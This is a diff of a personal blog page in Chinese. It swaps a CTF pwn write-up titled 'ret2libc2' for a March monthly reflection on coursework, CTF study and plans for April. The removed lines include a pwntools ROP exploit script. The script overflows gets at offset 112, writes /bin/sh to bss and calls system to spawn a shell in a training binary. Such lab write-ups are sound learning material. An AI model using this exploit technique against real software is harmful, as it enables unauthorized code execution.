@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="magnesium">
   <meta name="keywords" content="">
-  <title>ret2libc2 - +mg&#39;s blog</title>
+  <title>三月总结 - +mg&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -150,7 +150,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.1)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="ret2libc2">
+            <span class="h2" id="subtitle" title="三月总结">
               
             </span>
 
@@ -160,8 +160,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-03-14 20:09" pubdate>
-        2021年3月14日 晚上
+      <time datetime="2021-04-03 00:14" pubdate>
+        2021年4月3日 凌晨
       </time>
     </span>
   
@@ -172,7 +172,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      286 字
+      926 字
     </span>
   
 
@@ -182,7 +182,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      3
+      9
        分钟
     </span>
   
@@ -212,28 +212,15 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">ret2libc2</h1>
+            <h1 style="display: none">三月总结</h1>
             
             <div class="markdown-body">
-              <p>先checksec，还是开了NX，就不能用shellcode了。</p>
-<p><img src="4.png" srcset="/img/loading.gif"></p>
-<p>看ida</p>
-<p><img src="1.png" srcset="/img/loading.gif"></p>
-<p>gets存在栈溢出漏洞，cyclic计算一下地址偏移量</p>
-<p><img src="2.png" srcset="/img/loading.gif"></p>
-<p>偏移地址仍然是112，那么填充112个垃圾数据就能劫持返回地址。</p>
-<p><img src="3.png" srcset="/img/loading.gif"></p>
-<p>在ida里看到有system的plt地址，但是没有找到/bin/sh，所以要手动把/bin/sh填充进去，然后有了binsh的地址，就能作为system的参数，这样就变成了ret2libc1。</p>
-<p>然后是写ROPgadgets再次调用gets，把/bin/sh输入bss段里，这里bss段刚好有一个buf2可以放。</p>
-<p><img src="6.png" srcset="/img/loading.gif"></p>
-<p>接下来是找到gets的地址。</p>
-<p><img src="5.png" srcset="/img/loading.gif"></p>
-<p>就可以写exp啦</p>
-<p>这里有两种方法，参见<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c4780335b842">https://www.jianshu.com/p/c4780335b842</a></p>
-<p>第二种用到栈堆平衡，就要先把gets的参数pop出来，pop到哪都无所谓，所以就ROP找一找pop的指令</p>
-<p><img src="7.png" srcset="/img/loading.gif"></p>
-<p>随便用一个短的pop ebx</p>
-<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">p</span> = process(&#x27;./ret<span class="hljs-number">2</span>libc<span class="hljs-number">2</span>&#x27;)<br><span class="hljs-attribute">context</span>.log_level = &#x27;debug&#x27;<br><span class="hljs-attribute">gdb</span>.attach(p)<br><br><span class="hljs-attribute">system_plt</span> = <span class="hljs-number">0</span>x<span class="hljs-number">08048490</span><br><span class="hljs-attribute">gets_plt</span> = <span class="hljs-number">0</span>x<span class="hljs-number">08048460</span><br><span class="hljs-attribute">buf2</span> = <span class="hljs-number">0</span>x<span class="hljs-number">0804</span>a<span class="hljs-number">080</span><br><span class="hljs-attribute">pop_ebx</span> = <span class="hljs-number">0</span>x<span class="hljs-number">0804843</span>d<br><span class="hljs-attribute">p</span>.recvuntil(&#x27;What do you think ?&#x27;)<br><span class="hljs-comment"># payload = &#x27;a&#x27; * 112 + p32(gets_plt) +p32(system_plt) +p32(buf2)+ p32(buf2)</span><br><span class="hljs-attribute">payload</span> = &#x27;a&#x27; * <span class="hljs-number">112</span> + p<span class="hljs-number">32</span>(gets_plt) + p<span class="hljs-number">32</span>(pop_ebx) + p<span class="hljs-number">32</span>(buf<span class="hljs-number">2</span>) + p<span class="hljs-number">32</span>(system_plt) +&#x27;b&#x27; * <span class="hljs-number">4</span> + p<span class="hljs-number">32</span>(buf<span class="hljs-number">2</span>)<br><span class="hljs-attribute">p</span>.send(payload)<br><span class="hljs-attribute">p</span>.sendline(&#x27;/bin/sh&#x27;)<br><br><span class="hljs-attribute">p</span>.interactive()<br></code></pre></div></td></tr></table></figure>
+              <p>趁着清明节小假期开始前的一点点空闲时间，想记录一下这个月的事情和接下来的思路</p>
+<h3 id="课内学习"><a href="#课内学习" class="headerlink" title="课内学习"></a>课内学习</h3><p>比起上个学期的课程任务确实重了挺多的，倒是对绩点没那么看重了，思考了很多方面的问题，最后决定还是把重心放在想学的东西上面，毕竟说实在的，填报大学的时候也是为了兴趣，兴趣始终应该是我的方向。关于这学期的课程，大概就稍微按部就班一点，工作日能挤出的时间确实不算多，被各种琐事充斥的时间走得也太快了，也因为身体的状况，这学期还是希望能每天保持1.5h的锻炼和良好作息，每天9点就结束自己一天的学习了，虽然这么说确实比不上别人勤奋，但对我来说身体永远是第一位，算下来每天就只能挤出一点时间做课外的事情。关于比较喜欢的课程目前其实只有程序设计一门课，虽然分少作业量大，每周大概都要花7-8个小时写作业的程序，但是明显能感觉到我的代码能力有挺大的提升，课程教的也是挺有启发意义的题目，这算是我第一个比较接近理想中的大学计算机专业的课程吧，虽然只有1学分，但是学得很开心就够了。</p>
+<h3 id="关于CTF"><a href="#关于CTF" class="headerlink" title="关于CTF"></a>关于CTF</h3><p>这个月进度并不大，花的时间太少了，但是神奇的是，我在pwn上的学习成果是我hgame那一个月的好几倍，一方面是hgame的时候不太敢去做pwn的题，也怕总分低就不敢花认真从头学起，另一方面是脱离了比赛的环境以后，心态稳了很多，压力也低了很多，遇到问题也没那么容易慌，能沉下心看一些晦涩的资料了，这确实是一个蛮好的开始。这个月的进度小也是确实的，现在目前为止只学到了高级ROP，因为很多概念不懂导致学习的过程还是有点艰难的，需要不停找资料看，做的题也确实太少了，但是慢慢地学到了很多解决问题的方法和思路，总算还是有收获的。</p>
+<h3 id="关于四月"><a href="#关于四月" class="headerlink" title="关于四月"></a>关于四月</h3><p>四月份大概要稍微搁置一下ctf的学习直到期中考试后了，但并不是完全不学，基本上每周还是要尝试着看别人的wp做题，这个月的主要事情是跟朋友一起尝试做一个微信小程序，这对我来说是一个非常难得的机会，我在计算机很多底层原理和运作其实有非常大的知识盲区，看书也常常是看了就忘，做小程序这个事情对我而言应该能学到非常多的软件运作方面的知识，包括我从未接触过的后端开发的一些能力，我觉得学ctf的时候很吃力也是因为吃了底层原理的亏，所以这个月我会全身心地跟朋友去开发这个小程序，还是非常感谢我的朋友能给我这个学习的机会orz，连我这种一问三不知的都愿意带，也不想辜负他们的期望，最近已经开始学习java和springboot，希望这一个多月能带给我很多收获。</p>
+<p>既然方向没错，走慢点又何妨</p>
+
             </div>
             <hr>
             <div>
@@ -242,7 +229,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/pwn/">pwn</a>
+                      <a class="hover-with-bg" href="/categories/%E9%9A%8F%E6%9C%BA/">随机</a>
                     
                   </div>
                 
@@ -256,18 +243,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/03/27/ciscn-2019-c-1/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ciscn_2019_c_1</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/03/10/ret2libc1/">
-                        <span class="hidden-mobile">ret2libc1</span>
+                      <a href="/2021/03/27/ciscn-2019-c-1/">
+                        <span class="hidden-mobile">ciscn_2019_c_1</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
